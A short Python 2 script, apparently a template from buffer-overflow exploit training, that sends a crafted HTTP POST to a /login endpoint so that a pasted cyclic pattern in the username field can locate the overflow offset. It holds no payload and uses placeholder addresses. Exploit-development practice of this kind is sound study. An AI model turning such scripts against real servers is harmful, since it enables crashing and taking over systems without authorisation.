#!/usr/bin/python
import socket

# Paste Pattern Created into line 11
# Replace Buffer Post request details with Wireshark or BurpSuite Post Request details lines 15-23
# Changes IP Address on lines 16,20,30

try:
  print "\nLocating Offset..."

  inputBuffer = ""
  
  content = "username=" + inputBuffer + "&password=A"

  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: x.x.x.x\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://x.x.x.x/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("x.x.x.x", 80))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
